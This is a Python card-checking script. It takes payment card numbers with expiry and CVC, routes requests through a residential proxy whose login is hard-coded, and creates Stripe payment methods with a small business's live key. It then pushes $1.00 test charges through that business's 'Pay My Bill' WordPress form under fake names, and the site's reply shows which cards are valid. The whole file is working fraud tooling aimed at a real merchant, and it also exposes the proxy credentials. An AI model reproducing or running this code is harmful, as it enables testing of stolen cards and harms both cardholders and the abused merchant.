import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	url = "https://api.stripe.com/v1/payment_methods"
	
	payload = {
	  'type': "card",
	  'card[number]': n,
	  'card[cvc]': cvc,
	  'card[exp_month]': mm,
	  'card[exp_year]': yy,
	  'guid': "NA",
	  'muid': "NA",
	  'sid': "NA",
	  'payment_user_agent': "stripe.js/20e04cd437; stripe-js-v3/20e04cd437; card-element",
	  'key': "pk_live_51E63ENKGow8M1pwUr2OFDm4QI539BrmiUdavhuaBuT0A6DDsl0GtTphGVibOS8StRzRc66Fsnsju1Wd3B0slYAOj00y0U6wujC",
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json",
	  'authority': "api.stripe.com",
	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
	  'origin': "https://js.stripe.com",
	  'referer': "https://js.stripe.com/",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-dest': "empty",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-site': "same-site"
	}
	
	response = session.post(url, data=payload, headers=headers)
	
	pm = response.json()['id']
	
	url = "https://mercurywv.com/wp-admin/admin-ajax.php"
	
	payload = {
	  'wpforms[fields][0][first]': 'Rodam',
	  'wpforms[fields][0][last]': 'User',
	  'wpforms[fields][1]': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
	  'wpforms[fields][5]': '1',
	  'wpforms[fields][2]': '1.00',
	  'wpforms[fields][3]': '',
	  'wpforms[stripe-credit-card-cardname]': 'Dao Khao Saard',
	  'wpforms[hp]': '',
	  'wpforms[id]': '4178',
	  'page_title': 'Pay My Bill',
	  'page_url': 'https://mercurywv.com/pay-bill/',
	  'url_referer': '',
	  'page_id': '105',
	  'wpforms[post_id]': '105',
	  'wpforms[payment_method_id]': pm,
	  'wpforms[token]': 'aba2ee731f2c7937f0fdb2e62fe190d8',
	  'action': 'wpforms_submit',
	  'start_timestamp': '1750781345',
	  'end_timestamp': '1750781360'
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/javascript, */*; q=0.01",
	  'authority': "mercurywv.com",
	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
	  'origin': "https://mercurywv.com",
	  'referer': "https://mercurywv.com/pay-bill/",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-dest': "empty",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-site': "same-origin",
	  'x-requested-with': "XMLHttpRequest"
	}
	
	response = session.post(url, data=payload, headers=headers)
	
	result = re.search(r'<p>(.*?)<\\/p>', response.text).group(1)
		
	return (result)
